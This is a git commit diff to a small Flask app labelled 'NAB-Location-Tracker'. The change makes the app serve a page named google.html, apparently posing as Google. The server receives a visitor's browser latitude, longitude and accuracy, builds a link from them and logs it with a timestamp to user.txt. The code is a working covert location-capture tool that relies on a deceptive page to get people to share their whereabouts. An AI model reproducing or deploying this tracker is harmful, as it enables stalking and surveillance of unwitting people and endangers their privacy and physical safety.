2d17ab5d9cdd7bd161f322224ba51b13718731cc
1blackghost <87479500+1blackghost@users.noreply.github.com>
2022-02-05 20:47:11 -0800

    Update app.py

--- app.py
+++ app.py
@@ -1,13 +1,16 @@
 from flask import Flask, render_template, request, jsonify,redirect,url_for
 import datetime 
-    
+
+
 done=False
 
 app = Flask(__name__)
+
+
 @app.route('/')
 def index():
     print("[+]NAB-Location-Tracker Active")
-    return render_template('index.html')
+    return render_template('google.html')
 
 
 @app.route('/post', methods=['POST',"GET"])
@@ -16,7 +19,7 @@ def say_name():
     try:
         data=data.split(":")
     except:
-        return render_template('index.html')
+        return render_template('google.html')
     
     try:
         print("Logging to user.txt for more reference..")
@@ -26,17 +29,22 @@ def say_name():
         print("Accuracy: ",data[2])
         print("[+]Location successfully captured!")
         current_time = datetime.datetime.now() 
+        global done
         if not done:
 
             with open('user.txt','a') as f:
                 f.write(str('\n')+str("|")+str(current_time)+str("|")+str(link)+str("|")+str(data[2]))
+            
+            done=True
 
-        return render_template('index.html')
+
+        return render_template('google.html')
         
-    except:
+    except Exception as e:
+        print(e)
         print("[-]Error: I guess,Location Access Denied!")
-        return render_template("index.html")
+        return render_template("google.html")
 
 
 if __name__ == '__main__':
-    app.run(debug=True,host="0.0.0.0",port=80)
+    app.run(debug=True)
